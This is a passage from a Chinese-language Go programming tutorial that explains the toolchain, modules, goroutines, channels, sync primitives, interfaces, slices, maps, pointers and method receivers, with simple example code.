或其他版本控制系统上的外部项目，Go Modules 会负责下载和管理这些依赖。</li></ul><p>这种机制非常适合版本控制和协作开发，确保了代码的模块化和依赖管理的清晰。💻🔍🌐</p><h1 id="go工具链和go模块"><a href="#go工具链和go模块" class="headerlink" title="go工具链和go模块"></a>go工具链和go模块</h1><p>在 Go 语言中，”Go 工具链”和”模块”是两个非常核心的概念，特别是对于项目的构建、依赖管理和包的组织来说至关重要。下面我们来详细探讨一下这两个概念：</p><h3 id="Go-工具链（Go-Toolchain）"><a href="#Go-工具链（Go-Toolchain）" class="headerlink" title="Go 工具链（Go Toolchain）"></a>Go 工具链（Go Toolchain）</h3><p>Go 工具链是一系列工具的集合，这些工具用于处理 Go 代码的编译、安装、格式化、测试等任务。主要包括以下几个部分：</p><ol><li><p><strong>go build</strong></p><ul><li>用于编译 Go 程序和包。</li><li>它会编译指定的源文件、依赖，并生成可执行文件或库。</li></ul></li><li><p><strong>go run</strong></p><ul><li>直接运行 Go 程序，通常用于快速测试。</li><li>它实际上是 <code>go build</code> 和执行编译后的程序的组合。</li></ul></li><li><p><strong>go test</strong></p><ul><li>运行测试用例，包括单元测试、基准测试等。</li><li>它可以自动找到源代码中的测试代码并执行。</li></ul></li><li><p><strong>go get</strong></p><ul><li>在 Go Modules 出现之前，它用于下载和安装包及其依赖。</li><li>在 Go Modules 环境下，它还能用于添加依赖到你的项目中。</li></ul></li><li><p><strong>go mod</strong></p><ul><li>Go Modules 的命令行接口，用于处理模块的依赖管理。</li><li>包括初始化新模块、添加、更新、移除依赖等。</li></ul></li><li><p><strong>go fmt</strong></p><ul><li>格式化 Go 源代码，确保代码风格一致。</li></ul></li><li><p><strong>go env</strong></p><ul><li>查看和设置 Go 环境变量。</li></ul></li></ol><p>这些工具都是 Go 语言标准发行版的一部分，对于日常的 Go 开发来说非常重要。</p><h3 id="Go-模块（Go-Modules）"><a href="#Go-模块（Go-Modules）" class="headerlink" title="Go 模块（Go Modules）"></a>Go 模块（Go Modules）</h3><p>Go 模块是 Go 语言的依赖管理系统，于 Go 1.11 版本中引入，现在已经是管理依赖的首选方式。</p><ol><li><p><strong>模块的概念</strong></p><ul><li>模块是一系列 Go 包的集合，它们被放置在同一个文件系统目录下，由一个 <code>go.mod</code> 文件所描述。</li><li><code>go.mod</code> 文件包含了模块的名称、依赖项及它们的版本。</li></ul></li><li><p><strong>功能</strong></p><ul><li>提供了对依赖版本的精确控制，确保项目的可重复构建。</li><li>允许开发者在项目外的任何地方工作，不再受限于 <code>GOPATH</code>。</li></ul></li><li><p><strong>主要命令</strong></p><ul><li><code>go mod init</code>：初始化新模块，创建 <code>go.mod</code> 文件。</li><li><code>go mod tidy</code>：整理现有的依赖，移除不再需要的依赖。</li><li><code>go mod download</code>：下载 <code>go.mod</code> 文件中指定的所有依赖。</li></ul></li></ol><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p>Go 工具链和 Go 模块共同构成了 Go 语言的生态系统的基础，它们使得 Go 代码的开发、构建、格式化、测试以及依赖管理变得简单和高效。理解和熟练使用这些工具和概念，对于任何 Go 开发者来说都是非常重要的。💡🔧📦🚀</p><h1 id="并发（Concurrency）与并行（Parallelism）"><a href="#并发（Concurrency）与并行（Parallelism）" class="headerlink" title="并发（Concurrency）与并行（Parallelism）"></a>并发（Concurrency）与并行（Parallelism）</h1><ul><li><strong>并发</strong>：多个任务可以在重叠的时间段内进行，但不一定同时。</li><li><strong>并行</strong>：多个任务真正同时进行，通常需要多核处理器。</li></ul><p>Go 语言的并发模型使得并发编程更加简单和高效。</p><h3 id="Goroutines"><a href="#Goroutines" class="headerlink" title="Goroutines"></a>Goroutines</h3><ol><li><p><strong>定义</strong></p><ul><li>Goroutine 是 Go 语言的轻量级线程，由 Go 运行时环境管理。</li><li>Goroutines 在相同的地址空间中运行，因此访问共享内存必须是安全的。</li></ul></li><li><p><strong>创建 Goroutine</strong></p><ul><li>使用 <code>go</code> 关键字 followed by a function call.<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> functionName()</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>示例</strong></p><ul><li>假设有一个函数 <code>printNumbers</code>，打印数字1到5。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printNumbers</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        fmt.Println(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>在主函数中并发执行：<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> printNumbers()</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="Channels"><a href="#Channels" class="headerlink" title="Channels"></a>Channels</h3><ol><li><p><strong>定义</strong></p><ul><li>Channels 是用来在 Goroutines 之间传递数据的管道。</li><li>可以是带缓冲的或无缓冲的。</li></ul></li><li><p><strong>创建 Channel</strong></p><ul><li>无缓冲：<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br></pre></td></tr></table></figure></li><li>带缓冲：<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">5</span>) <span class="comment">// 缓冲大小为5</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>使用 Channel</strong></p><ul><li>发送数据到 Channel：<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ch &lt;- value</span><br></pre></td></tr></table></figure></li><li>从 Channel 接收数据：<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">value := &lt;-ch</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>关闭 Channel</strong></p><ul><li>使用 <code>close()</code> 函数。</li><li>关闭后不能再向 Channel 发送数据，但可以继续接收数据。</li></ul></li><li><p><strong>示例</strong></p><ul><li>创建一个 Channel 传递整数。</li><li>在一个 Goroutine 中发送数字到 Channel，在主 Goroutine 中接收它们。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">            ch &lt;- i</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">close</span>(ch)</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> num := <span class="keyword">range</span> ch &#123;</span><br><span class="line">        fmt.Println(num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>避免死锁</strong>：确保 Goroutines 之间的通信是正确的，否则可能导致死锁。</li><li><strong>同步</strong>：使用 <code>sync</code> 包中的工具（如 WaitGroup）来同步 Goroutines。</li><li><strong>数据竞争</strong>：当多个 Goroutines 访问共享资源时，需要使用锁（如 <code>sync.Mutex</code>）来避免数据竞争。</li></ul><h3 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h3><p>Go 语言中的并发编程强大且易于理解。通过 Goroutines 和 Channels，你可以高效地构建并发程序。作为新手，你可能需要一些时间来熟悉这些概念，但一旦掌握，它们会大大增强你的编程能力。实践是最好的学习方式，尽量多编写并发程序来提高你的技能！💻🚀🔧</p><p>好的，我来一一解答你的问题：</p><h3 id="1-匿名函数和立即执行"><a href="#1-匿名函数和立即执行" class="headerlink" title="1. 匿名函数和立即执行"></a>1. 匿名函数和立即执行</h3><p>在你提到的代码片段中：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        ch &lt;- i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>这里使用的是一个<strong>匿名函数</strong>，并且这个匿名函数是<strong>立即执行</strong>的。</p><ul><li><strong>匿名函数</strong>：就是没有名字的函数。在 Go 中，可以使用 <code>func</code> 关键字来直接定义一个匿名函数。</li><li><strong>立即执行</strong>：在定义匿名函数后，紧接着的 <code>()</code> 使这个函数立即执行。这种模式在 Go 中很常见，特别是在需要并发执行函数时。</li></ul><h3 id="2-死锁（Deadlock）"><a href="#2-死锁（Deadlock）" class="headerlink" title="2. 死锁（Deadlock）"></a>2. 死锁（Deadlock）</h3><p>死锁是并发编程中的一个常见问题，它发生在以下情况：</p><ul><li>当两个或多个 goroutines 在执行过程中，彼此等待对方释放资源，从而造成了无限等待的情况。</li><li>常见的情况包括：<ul><li>两个 goroutines 互相等待对方完成，都不释放自己持有的资源。</li><li>试图从一个空的 channel 中接收数据，而没有其他 goroutine 发送数据到这个 channel。</li><li>试图向一个已满的 channel 发送数据，而没有其他 goroutine 接收数据。</li></ul></li></ul><p>死锁的解决通常需要对程序的逻辑进行仔细的分析和设计，确保资源的正确释放和合理的同步。</p><h3 id="3-使用-sync-包"><a href="#3-使用-sync-包" class="headerlink" title="3. 使用 sync 包"></a>3. 使用 <code>sync</code> 包</h3><p><code>sync</code> 包提供了多种同步原语（如互斥锁、等待组等），用于在 goroutines 之间进行同步。</p><h4 id="WaitGroup"><a href="#WaitGroup" class="headerlink" title="WaitGroup"></a>WaitGroup</h4><ul><li>用于等待一组 goroutines 完成。</li><li>主要方法包括 <code>Add</code>, <code>Done</code>, 和 <code>Wait</code>。</li></ul><p><strong>示例</strong>：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>) <span class="comment">// 增加等待计数</span></span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> wg.Done() <span class="comment">// 完成时减少等待计数</span></span><br><span class="line">            fmt.Println(i)</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait() <span class="comment">// 等待所有 goroutine 完成</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Mutex（互斥锁）"><a href="#Mutex（互斥锁）" class="headerlink" title="Mutex（互斥锁）"></a>Mutex（互斥锁）</h4><ul><li>用于在多个 goroutine 访问共享资源时提供互斥访问。</li><li>主要方法是 <code>Lock</code> 和 <code>Unlock</code>。</li></ul><p><strong>示例</strong>：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mu sync.Mutex</span><br><span class="line"><span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">increment</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mu.Lock()   <span class="comment">// 加锁</span></span><br><span class="line">    count++     <span class="comment">// 修改共享资源</span></span><br><span class="line">    mu.Unlock() <span class="comment">// 解锁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些是 <code>sync</code> 包中最常用的两种类型。在并发编程中正确地使用这些工具，可以帮助你避免死锁和数据竞争，确保程序的安全性和稳定性。记得实践是最好的学习方式，多尝试编写一些并发代码，你会越来越熟练的！💪📚💻</p><p>当然可以！互斥锁（Mutex）是并发编程中一种非常重要的机制，用于控制对共享资源的访问，以确保在任何时刻只有一个 goroutine 可以访问该资源。这有助于避免并发时出现的数据竞争和不一致的问题。让我们通过一个简单的例子来详细理解互斥锁的使用。</p><h3 id="互斥锁（Mutex）的基本概念"><a href="#互斥锁（Mutex）的基本概念" class="headerlink" title="互斥锁（Mutex）的基本概念"></a>互斥锁（Mutex）的基本概念</h3><ul><li><strong>互斥锁</strong>用于在多个 goroutines 访问共享资源时提供安全的访问方式。</li><li>任何时候只有一个 goroutine 能够持有锁。</li><li>如果一个 goroutine 已经持有了锁，其他尝试获取锁的 goroutine 将会等待（阻塞），直到锁被释放。</li></ul><h3 id="示例：共享计数器"><a href="#示例：共享计数器" class="headerlink" title="示例：共享计数器"></a>示例：共享计数器</h3><p>假设我们有一个共享的计数器，多个 goroutines 同时对其进行增加操作。不使用互斥锁的情况下，可能会发生数据竞争，导致计数器的值出错。</p><p>下面是使用互斥锁来确保安全访问共享计数器的例子：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> mu sync.Mutex</span><br><span class="line">    <span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动 100 个 goroutines 来增加计数器</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">10</span>; j++ &#123;</span><br><span class="line">                mu.Lock()   <span class="comment">// 在访问共享资源前加锁</span></span><br><span class="line">                count++     <span class="comment">// 修改共享资源</span></span><br><span class="line">                mu.Unlock() <span class="comment">// 完成操作后解锁</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待一秒确保所有 goroutine 完成</span></span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Final count:&quot;</span>, count)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中：</p><ul><li>我们定义了一个名为 <code>mu</code> 的 <code>sync.Mutex</code> 和一个共享的 <code>count</code> 计数器。</li><li>启动了 100 个 goroutines，每个 goroutine 会尝试将计数器增加 10 次。</li><li>每次增加操作前，我们通过 <code>mu.Lock()</code> 加锁，确保在修改 <code>count</code> 时不会有其他 goroutine 同时访问它。</li><li>操作完成后，使用 <code>mu.Unlock()</code> 解锁。</li></ul><p>通过这种方式，即使多个 goroutine 并发执行，我们也能确保 <code>count</code> 的值在任何时候都是准确的，避免了数据竞争。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>互斥锁是并发编程中保护共享资源的重要工具。正确使用它们能够确保数据的一致性和程序的稳定性。但是要注意，过度使用锁可能会导致程序性能下降，因为它限制了并发的程度。因此，合理设计锁的使用策略是并发编程的一个重要方面。💻🔐👍</p><p>好的，我来设计一个既使用互斥锁（<code>sync.Mutex</code>）又使用工作组（<code>sync.WaitGroup</code>）的示例。在这个案例中，我们将创建多个 goroutines 来更新一个共享数据结构，比如一个计数器。我们会使用互斥锁来保护这个共享数据，以避免数据竞争，同时使用工作组来等待所有 goroutine 完成。</p><h3 id="示例描述"><a href="#示例描述" class="headerlink" title="示例描述"></a>示例描述</h3><ul><li><strong>目标</strong>：创建多个 goroutines，每个 goroutine 对共享计数器增加特定的值。</li><li><strong>工具</strong>：<ul><li><strong>互斥锁（<code>sync.Mutex</code>）</strong>：确保每次只有一个 goroutine 能够访问并修改计数器。</li><li><strong>工作组（<code>sync.WaitGroup</code>）</strong>：等待所有 goroutine 完成。</li></ul></li></ul><h3 id="示例代码-2"><a href="#示例代码-2" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    <span class="keyword">var</span> mu sync.Mutex</span><br><span class="line">    <span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个函数，用于增加计数器</span></span><br><span class="line">    increment := <span class="function"><span class="keyword">func</span><span class="params">(inc <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> wg.Done() <span class="comment">// 确保在函数结束时通知 WaitGroup</span></span><br><span class="line">        mu.Lock()       <span class="comment">// 在修改共享资源前加锁</span></span><br><span class="line">        count += inc    <span class="comment">// 修改共享资源</span></span><br><span class="line">        mu.Unlock()     <span class="comment">// 完成操作后解锁</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动多个 goroutines</span></span><br><span class="line">    increments := []<span class="type">int</span>&#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> _, inc := <span class="keyword">range</span> increments &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>) <span class="comment">// 为每个 goroutine 增加计数</span></span><br><span class="line">        <span class="keyword">go</span> increment(inc)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wg.Wait() <span class="comment">// 等待所有 goroutine 完成</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Final count:&quot;</span>, count)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中：</p><ul><li>我们定义了一个名为 <code>increment</code> 的函数，这个函数接受一个整数作为参数，将其加到 <code>count</code> 上。</li><li>为每个要执行的 <code>increment</code> 操作，我们启动一个新的 goroutine。</li><li>每个 goroutine 开始前，使用 <code>wg.Add(1)</code> 增加工作组的计数。</li><li>在 <code>increment</code> 函数内部，首先使用 <code>defer wg.Done()</code> 来确保函数结束时，通知工作组一个任务已经完成。</li><li>使用 <code>mu.Lock()</code> 和 <code>mu.Unlock()</code> 来保护对 <code>count</code> 的访问和修改。</li><li>最后，<code>wg.Wait()</code> 在 <code>main</code> 函数中等待所有 goroutine 完成，然后打印出最终的 <code>count</code> 值。</li></ul><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>这个例子展示了如何在并发编程中同时使用互斥锁和工作组来安全地更新共享资源，并等待多个并发操作的完成。这种模式在处理并发数据共享和同步任务时非常有用。记得多实践，这样你会对 Go 的并发机制有更深的理解和掌握！🔒🔄💻🚀</p><h1 id="细节补充"><a href="#细节补充" class="headerlink" title="细节补充"></a>细节补充</h1><p>在 Go 语言中，接口（interface）、切片（slice）、映射（map）和指针（pointer）是非常核心的概念。下面我将逐一进行详细而易懂的介绍。</p><h3 id="1-接口（Interface）"><a href="#1-接口（Interface）" class="headerlink" title="1. 接口（Interface）"></a>1. 接口（Interface）</h3><p>接口是一种类型，它定义了一组方法，但这些方法不需要实现。任何定义了这些方法的类型都自动地实现了这个接口。</p><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><ul><li>定义接口：<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Shape <span class="keyword">interface</span> &#123;</span><br><span class="line">    Area() <span class="type">float64</span></span><br><span class="line">    Perimeter() <span class="type">float64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>实现接口：只要一个类型提供了接口中所有方法的实现，它就实现了该接口。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Rectangle <span class="keyword">struct</span> &#123;</span><br><span class="line">    Length, Width <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Rectangle)</span></span> Area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.Length * r.Width</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Rectangle)</span></span> Perimeter() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * (r.Length + r.Width)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h4><ul><li><strong>接口组合</strong>：可以通过组合现有的接口来创建新接口。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Geometry <span class="keyword">interface</span> &#123;</span><br><span class="line">    Shape</span><br><span class="line">    SomeOtherMethod()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>空接口</strong>：空接口 <code>interface&#123;&#125;</code> 可以表示任何类型，常用于泛型编程或处理未知类型的值。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DoSomething</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-切片（Slice）"><a href="#2-切片（Slice）" class="headerlink" title="2. 切片（Slice）"></a>2. 切片（Slice）</h3><p>切片是对数组的抽象，Go 中的切片更加强大和灵活。</p><h4 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h4><ul><li>创建切片：使用 <code>make</code> 函数或字面量。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s1 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">10</span>) <span class="comment">// 长度为10</span></span><br><span class="line">s2 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="高级用法-1"><a href="#高级用法-1" class="headerlink" title="高级用法"></a>高级用法</h4><ul><li><strong>切片追加</strong>：使用 <code>append</code> 函数向切片追加元素。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>) <span class="comment">// s 现在是 [1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure></li><li><strong>切片截取</strong>：可以通过切片的截取创建新的切片。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">s2 := s[<span class="number">1</span>:<span class="number">3</span>] <span class="comment">// s2 是 [2, 3]</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-映射（Map）"><a href="#3-映射（Map）" class="headerlink" title="3. 映射（Map）"></a>3. 映射（Map）</h3><p>映射是键值对的集合。</p><h4 id="基本用法-2"><a href="#基本用法-2" class="headerlink" title="基本用法"></a>基本用法</h4><ul><li>创建映射：使用 <code>make</code> 函数。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">m[<span class="string">&quot;key&quot;</span>] = <span class="number">42</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="高级用法-2"><a href="#高级用法-2" class="headerlink" title="高级用法"></a>高级用法</h4><ul><li><strong>迭代映射</strong>：使用 <code>range</code> 遍历映射。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> m &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Key:&quot;</span>, key, <span class="string">&quot;Value:&quot;</span>, value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>映射的切片</strong>：可以创建映射的切片来实现动态的嵌套结构。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ms := <span class="built_in">make</span>([]<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>, <span class="number">0</span>)</span><br><span class="line">ms = <span class="built_in">append</span>(ms, <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;<span class="string">&quot;key&quot;</span>: <span class="number">42</span>&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-指针（Pointer）"><a href="#4-指针（Pointer）" class="headerlink" title="4. 指针（Pointer）"></a>4. 指针（Pointer）</h3><p>指针存储了值在内存中的地址。</p><h4 id="基本用法-3"><a href="#基本用法-3" class="headerlink" title="基本用法"></a>基本用法</h4><ul><li>使用 <code>&amp;</code> 获取变量的地址，使用 <code>*</code> 来访问指针指向的值。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a := <span class="number">42</span></span><br><span class="line">p := &amp;a <span class="comment">// p 是指向 a 的指针</span></span><br><span class="line">fmt.Println(*p) <span class="comment">// 读取 p 指向的值</span></span><br><span class="line">*p = <span class="number">21</span> <span class="comment">// 修改 p 指向的值</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="高级用法-3"><a href="#高级用法-3" class="headerlink" title="高级用法"></a>高级用法</h4><ul><li><strong>结构体与指针</strong>：可以使用指针来访问或修改结构体的成员。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">type</span> Vertex <span class="keyword">struct</span> &#123;</span><br><span class="line">     X, Y <span class="type">float64</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v := Vertex&#123;<span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"> p := &amp;v</span><br><span class="line"> p.X = <span class="number">4.5</span> <span class="comment">// 通过指针修改 v 的 X 值</span></span><br></pre></td></tr></table></figure></li><li><strong>指针接收者</strong>：在方法定义中使用指针接收者，可以修改接收者指向的值。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Vertex)</span></span> Scale(f <span class="type">float64</span>) &#123;</span><br><span class="line">    v.X = v.X * f</span><br><span class="line">    v.Y = v.Y * f</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>理解和熟练使用接口、切片、映射和指针对于编写高效和灵活的 Go 程序至关重要。这些概念是 Go 语言的基石，它们提供了强大的工具来构建复杂和高性能的应用程序。💻🔧🚀</p><h1 id="方法接收者"><a href="#方法接收者" class="headerlink" title="方法接收者"></a>方法接收者</h1><p>在 Go 语言中，<code>(r Rectangle)</code> 这部分被称为<strong>方法接收者</strong>，类似于其他语言中的“类方法”。不过，Go 没有类（class）的概念，而是使用结构体（struct）和方法接收者来实现类似的功能。</p><h3 id="方法接收者（Method-Receiver）"><a href="#方法接收者（Method-Receiver）" class="headerlink" title="方法接收者（Method Receiver）"></a>方法接收者（Method Receiver）</h3><p>在函数定义前的 <code>(r Rectangle)</code> 就是方法接收者的声明，它指定了这个函数是绑定在 <code>Rectangle</code> 类型上的。这意味着这个函数（<code>Area</code>）可以在 <code>Rectangle</code> 类型的变量上被调用，并且在函数内部可以访问接收者（<code>r</code>）的字段。</p><h3 id="示例解析"><a href="#示例解析" class="headerlink" title="示例解析"></a>示例解析</h3><p>考虑以下代码：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Rectangle <span class="keyword">struct</span> &#123;</span><br><span class="line">    Length, Width <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Rectangle)</span></span> Area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.Length * r.Width</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里：</p><ul><li><code>Rectangle</code> 是一个结构体类型，有两个字段：<code>Length</code> 和 <code>Width</code>。</li><li><code>func (r Rectangle) Area() float64</code> 定义了一个方法 <code>Area</code>，它计算矩形的面积。<ul><li><code>(r Rectangle)</code> 是方法接收者，意味着 <code>Area</code> 方法与 <code>Rectangle</code> 类型相关联。</li><li>在 <code>Area</code> 方法中，可以通过 <code>r</code> 来访问 <code>Rectangle</code> 实例的字段（<code>Length</code> 和 <code>Width</code>）。</li></ul></li></ul><h3 id="调用方式"><a href="#调用方式" class="headerlink" title="调用方式"></a>调用方式</h3><p>要调用这个方法，你需要一个 